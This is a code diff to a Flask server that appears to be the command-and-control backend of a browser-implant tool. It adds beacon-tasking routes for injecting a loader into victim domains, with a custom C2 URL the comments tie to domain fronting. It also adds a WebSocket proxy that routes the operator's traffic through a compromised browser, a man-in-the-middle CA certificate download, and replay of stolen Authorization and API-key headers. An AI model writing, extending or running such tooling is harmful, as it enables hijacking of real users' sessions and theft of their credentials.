@@ -17,6 +17,7 @@ from enum import Enum
 from user_agents import parse
 from email.mime.text import MIMEText
 from flask_executor import Executor
+from flask_sock import Sock
 from apscheduler.schedulers.background import BackgroundScheduler
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives.serialization import load_der_public_key
@@ -132,6 +133,7 @@ logger.addHandler(fh)
 
 app = Flask(__name__)
 backgroundExecutor = Executor(app)
+sock = Sock(app)
 CORS(app)
 baseDir = os.path.abspath(os.path.dirname(__file__))
 
@@ -1873,6 +1875,20 @@ def serveDynamicInjectedPayload(beaconID, domain):
     return response
 
 
+@app.route('/api/bex/server_url', methods=['GET'])
+@login_required
+def getBexServerUrl():
+    try:
+        with open('bex-beacon/config.json', 'r') as f:
+            cfg = json.load(f)
+        domain = cfg['js_tap_server']['domain']
+        port   = cfg['js_tap_server']['port']
+        return jsonify({"serverUrl": f"https://{domain}:{port}"})
+    except Exception as e:
+        logger.warning(f"BEX: Could not read bex-beacon config: {e}")
+        return jsonify({"serverUrl": ""})
+
+
 @app.route('/api/bex/inject', methods=['POST'])
 @login_required
 def enableBexInjection():
@@ -1880,16 +1896,17 @@ def enableBexInjection():
     beaconID_raw = content.get('beaconID')
     domain       = content.get('domain')
     tag          = content.get('tag')
-    
+    serverUrl    = content.get('serverUrl', '').strip()
+
     # Resolve client to ensure we have the UUID even if the UI sent the internal ID
     client = Client.query.filter_by(id=beaconID_raw).first()
     if not client:
         client = Client.query.filter_by(uuid=beaconID_raw).first()
-    
+
     if not client:
         logger.warning(f"BEX: Client not found for injection: {beaconID_raw}")
         return "Client not found", 404
-    
+
     beaconID = client.uuid
     logger.info(f"BEX: Enabling injection for {domain} via beacon {beaconID} (ID: {client.id}) with tag {tag}")
 
@@ -1901,14 +1918,19 @@ def enableBexInjection():
     else:
         newInjection = BeaconInjection(beaconID=beaconID, domain=domain, tag=tag, active=True)
         db_session.add(newInjection)
-    
+
     dbCommit()
-    
+
     # Queue a configuration task for the beacon (client is already found above)
     # Send the LOADER URL, not the whole code
-    # We send a relative path so the beacon can resolve it against its own known C2 URL
-    loader_url = f"/lib/injected/{beaconID}/{domain}"
-    logger.info(f"BEX: Queuing relative loader URL: {loader_url}")
+    # If a custom C2 server URL is provided, build an absolute URL so the beacon
+    # uses it as-is (useful for domain fronting). Otherwise use a relative path.
+    if serverUrl:
+        loader_url = f"{serverUrl.rstrip('/')}/lib/injected/{beaconID}/{domain}"
+        logger.info(f"BEX: Queuing absolute loader URL: {loader_url}")
+    else:
+        loader_url = f"/lib/injected/{beaconID}/{domain}"
+        logger.info(f"BEX: Queuing relative loader URL: {loader_url}")
     
     taskData = {
         "type": "CONFIG_INJECTION",
@@ -2938,6 +2960,216 @@ def getBexTicket(domainID):
     }
 
     return jsonify(ticket)
+
+
+# ---------------------------------------------------------------------------
+# Bex Proxy — WebSocket + management API
+# ---------------------------------------------------------------------------
+from proxy.server import (
+    register_ws, unregister_ws, deliver_response, start_proxy, stop_proxy,
+    is_proxy_running, get_active_beacon, set_active_beacon, has_ws_connection,
+    set_spoof_config, get_spoof_config,
+)
+from proxy.certs import CA_CERT_PATH
+
+
+@sock.route('/ws/proxy/<session_uuid>')
+def proxy_websocket(ws, session_uuid):
+    """Persistent WebSocket for a beacon in proxy mode.
+    The beacon connects here after receiving a PROXY_START task."""
+    client = Client.query.filter_by(uuid=session_uuid).first()
+    if not client:
+        ws.close()
+        return
+
+    logger.info(f"Proxy WS: Beacon {session_uuid} connected")
+    register_ws(session_uuid, ws.send)
+
+    try:
+        while True:
+            msg = ws.receive(timeout=None)
+            if msg is None:
+                break
+            try:
+                data = json.loads(msg)
+                msg_type = data.get('type')
+                if msg_type == 'response':
+                    req_id = data.get('id', '?')
+                    status = data.get('status', '?')
+                    logger.info(f"Proxy WS: Got response from beacon (req_id={req_id}, status={status})")
+                    deliver_response(data.get('id'), data)
+                elif msg_type == 'ping':
+                    from proxy.server import _ws_send_lock
+                    with _ws_send_lock:
+                        ws.send(json.dumps({'type': 'pong'}))
+                else:
+                    logger.info(f"Proxy WS: Unknown message type '{msg_type}' from {session_uuid}: {str(msg)[:200]}")
+            except json.JSONDecodeError:
+                logger.warning(f"Proxy WS: Bad JSON from {session_uuid}: {str(msg)[:200]}")
+    except Exception as e:
+        logger.info(f"Proxy WS: Beacon {session_uuid} disconnected: {e}")
+    finally:
+        unregister_ws(session_uuid)
+        logger.info(f"Proxy WS: Beacon {session_uuid} cleaned up")
+
+
+@app.route('/api/proxy/start', methods=['POST'])
+@login_required
+def startProxy():
+    content = request.json
+    beaconID_raw = content.get('beaconID')
+    port = content.get('port', 8445)
+
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    beacon_uuid = client.uuid
+
+    # Start the MITM proxy server if not already running
+    if not is_proxy_running():
+        start_proxy(port=port)
+
+    set_active_beacon(beacon_uuid)
+
+    # Queue a PROXY_START task for the beacon so it opens a WebSocket back to us
+    taskData = {
+        "type": "PROXY_START",
+    }
+    jsonStr = json.dumps(taskData)
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
+                              code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
+    db_session.add(newJob)
+    dbCommit()
+
+    logger.info(f"Proxy: Started for beacon {beacon_uuid} on port {port}")
+    return jsonify({
+        'status': 'started',
+        'port': port,
+        'beaconID': beacon_uuid,
+        'caCertPath': CA_CERT_PATH,
+    })
+
+
+@app.route('/api/proxy/stop', methods=['POST'])
+@login_required
+def stopProxy():
+    beacon_uuid = get_active_beacon()
+
+    if beacon_uuid:
+        # Queue a PROXY_STOP task
+        client = Client.query.filter_by(uuid=beacon_uuid).first()
+        if client:
+            taskData = {"type": "PROXY_STOP"}
+            jsonStr = json.dumps(taskData)
+            newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
+                                      code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
+            db_session.add(newJob)
+            dbCommit()
+
+    stop_proxy()
+    return jsonify({'status': 'stopped'})
+
+
+@app.route('/api/proxy/status', methods=['GET'])
+@login_required
+def proxyStatus():
+    beacon_uuid = get_active_beacon()
+    return jsonify({
+        'running': is_proxy_running(),
+        'beaconID': beacon_uuid,
+        'wsConnected': has_ws_connection(beacon_uuid) if beacon_uuid else False,
+        'spoofConfig': get_spoof_config(beacon_uuid) if beacon_uuid else {},
+    })
+
+
+@app.route('/api/proxy/spoof', methods=['POST'])
+@login_required
+def setProxySpoof():
+    """Toggle credential spoofing for a domain on the active proxy beacon."""
+    content = request.json
+    domain = content.get('domain')
+    enabled = content.get('enabled', True)
+
+    beacon_uuid = get_active_beacon()
+    if not beacon_uuid:
+        return jsonify({'error': 'No active proxy'}), 400
+
+    set_spoof_config(beacon_uuid, domain, enabled)
+
+    # Build enriched spoof config with captured credential data for each enabled domain
+    spoofPayload = _build_spoof_payload(beacon_uuid)
+
+    # Notify the beacon of the updated spoof config so it knows which domains to inject creds for
+    client = Client.query.filter_by(uuid=beacon_uuid).first()
+    if client:
+        taskData = {
+            "type": "PROXY_SPOOF_UPDATE",
+            "spoofConfig": spoofPayload,
+        }
+        jsonStr = json.dumps(taskData)
+        newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
+                                  code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
+        db_session.add(newJob)
+        dbCommit()
+
+    return jsonify({'status': 'ok', 'domain': domain, 'enabled': enabled})
+
+
+def _build_spoof_payload(beacon_uuid):
+    """Build per-domain spoof config with captured headers and user-agent.
+    Returns {domain: {enabled, headers: [{name, value}], userAgent: str}} for each domain."""
+    config = get_spoof_config(beacon_uuid)
+    payload = {}
+
+    client = Client.query.filter_by(uuid=beacon_uuid).first()
+    if not client:
+        return payload
+
+    for domain, enabled in config.items():
+        entry = {'enabled': enabled, 'headers': [], 'userAgent': client.rawUserAgent or ''}
+
+        if enabled:
+            # Find the BeaconDomain record for this domain
+            bd = BeaconDomain.query.filter_by(clientID=beacon_uuid, domain=domain).first()
+            if bd:
+                # Get captured headers (Authorization, x-api-key, etc.) — most recent wins
+                captures = BeaconCapture.query.filter_by(domainID=bd.id, captureType='header') \
+                    .order_by(BeaconCapture.capturedAt.desc()).all()
+                seen = set()
+                for c in captures:
+                    if c.name.lower() not in seen:
+                        seen.add(c.name.lower())
+                        entry['headers'].append({'name': c.name, 'value': c.value})
+
+        payload[domain] = entry
+
+    return payload
+
+
+@app.route('/api/proxy/ca_cert', methods=['GET'])
+@login_required
+def downloadCaCert():
+    """Download the proxy CA certificate for browser import.
+    Generates the CA on first request if it doesn't exist yet."""
+    try:
+        if not os.path.exists(CA_CERT_PATH):
+            from proxy.certs import ensure_ca
+            ensure_ca()
+
+        with open(CA_CERT_PATH, 'rb') as f:
+            cert_data = f.read()
+
+        response = make_response(cert_data)
+        response.headers['Content-Type'] = 'application/x-x509-ca-cert'
+        response.headers['Content-Disposition'] = 'attachment; filename=jstap-proxy-ca.pem'
+        response.headers['Content-Length'] = len(cert_data)
+        return response
+    except Exception as e:
+        logger.error(f"CA cert download failed: {e}")
+        return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/clientEvents/<id>', methods=['GET'])
